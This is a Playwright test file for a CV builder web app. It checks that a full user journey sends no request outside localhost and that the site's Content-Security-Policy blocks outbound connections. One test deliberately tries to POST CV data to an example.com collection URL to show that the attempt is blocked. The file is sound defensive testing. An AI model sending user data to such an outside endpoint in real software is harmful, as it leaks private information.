import { expect, test } from '@playwright/test';
import { exportPdf, fixture, openBuilder, seedCv, showPreview } from './helpers';

test('a full journey makes no request to any other server and breaks no security rule', async ({ page }, testInfo) => {
  const outside: string[] = [];
  page.on('request', (request) => {
    const url = request.url();
    if (!url.startsWith('http://localhost:4317') && !/^(data|blob|about):/.test(url)) outside.push(url);
  });
  await page.addInitScript(() => {
    (window as unknown as { violations: string[] }).violations = [];
    document.addEventListener('securitypolicyviolation', (event) => (window as unknown as { violations: string[] }).violations.push(event.violatedDirective));
  });
  await seedCv(page, { personalInfo: { fullName: 'Private Person' } });
  await openBuilder(page);
  await page.locator('input[type=file][accept*=pdf]').setInputFiles(fixture('chrome-printed/E_table_layout.pdf'));
  await page.getByRole('button', { name: 'Replace current CV' }).click();
  await showPreview(page);
  await exportPdf(page, testInfo);
  expect(outside).toEqual([]);
  expect(await page.evaluate(() => (window as unknown as { violations: string[] }).violations)).toEqual([]);
});

test('the security policy stops CV data being sent anywhere', async ({ page }) => {
  const response = await page.goto('/');
  expect(response!.headers()['content-security-policy']).toContain("connect-src 'self'");
  const result = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/collect', { method: 'POST', body: 'cv' });
      return 'sent';
    } catch {
      return 'blocked';
    }
  });
  expect(result).toBe('blocked');
});
